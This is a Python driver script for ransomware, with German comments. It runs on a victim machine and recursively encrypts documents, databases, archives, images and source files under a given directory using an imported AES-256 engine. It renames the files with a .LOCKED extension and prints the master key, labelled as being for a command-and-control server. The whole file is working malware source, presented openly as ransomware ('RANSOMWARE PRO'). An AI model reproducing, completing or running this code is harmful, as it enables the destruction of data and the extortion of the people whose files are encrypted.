#!/usr/bin/env python3
"""
ENCRYPTOR TOOL
==============
Standalone Encryption Tool für Victim
Wird auf Victim-Maschine ausgeführt
"""

import sys
import os
import json
from pathlib import Path
from datetime import datetime
from encryption_engine import EncryptionEngine

def main():
    print("""
╔════════════════════════════════════════════════════════════╗
║           ENCRYPTION TOOL - RANSOMWARE PRO                ║
║        AES-256 Encryption with PBKDF2 Key Derivation      ║
╚════════════════════════════════════════════════════════════╝
    """)
    
    # Parse Arguments
    if len(sys.argv) < 2:
        print("[!] Usage: python encryptor.py <directory> [output_metadata.json]")
        print("\nExample:")
        print("  python encryptor.py C:\\Users\\Desktop\\TestFiles")
        print("  python encryptor.py C:\\Users\\Desktop\\TestFiles encryption_metadata.json")
        sys.exit(1)
    
    target_dir = sys.argv[1]
    metadata_file = sys.argv[2] if len(sys.argv) > 2 else "encryption_metadata.json"
    
    target_path = Path(target_dir)
    
    if not target_path.exists():
        print(f"[!] Directory not found: {target_dir}")
        sys.exit(1)
    
    # Initialisiere Encryption Engine
    print(f"[*] Initializing Encryption Engine...")
    engine = EncryptionEngine(
        encryption_extension=".LOCKED",
        pbkdf2_iterations=100000
    )
    
    print(f"[*] Master Key: {engine.get_master_key_hex()[:20]}...")
    print(f"[*] Extension: {engine.encryption_extension}")
    print()
    
    # Target Extensions
    target_extensions = {
        '.docx', '.xlsx', '.pptx', '.pdf',
        '.sql', '.mdb', '.accdb', '.db',
        '.zip', '.rar', '.7z',
        '.jpg', '.png', '.gif', '.bmp',
        '.txt', '.csv', '.json', '.log',
        '.c', '.cpp', '.py', '.js', '.html'
    }
    
    # Verschlüssele Verzeichnis
    print(f"[*] Scanning directory: {target_dir}")
    print(f"[*] Target extensions: {', '.join(sorted(target_extensions))}")
    print()
    
    success = engine.encrypt_directory(
        target_path,
        target_extensions=target_extensions,
        recursive=True,
        verbose=True
    )
    
    if not success:
        print("[!] No files encrypted!")
        sys.exit(1)
    
    # Speichere Metadaten
    print(f"\n[*] Saving metadata to: {metadata_file}")
    engine.save_metadata(metadata_file)
    
    print("\n" + "="*60)
    print("ENCRYPTION COMPLETE")
    print("="*60)
    print(f"Master Key (für C2 Server):")
    print(f"  {engine.get_master_key_hex()}")
    print()
    print(f"Files encrypted: {len(engine.encrypted_files)}")
    print(f"Total size: {engine.total_size_encrypted / (1024**3):.2f} GB")
    print(f"Failed: {len(engine.failed_files)}")
    print()
    print(f"Metadata saved to: {metadata_file}")
    print("="*60)

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
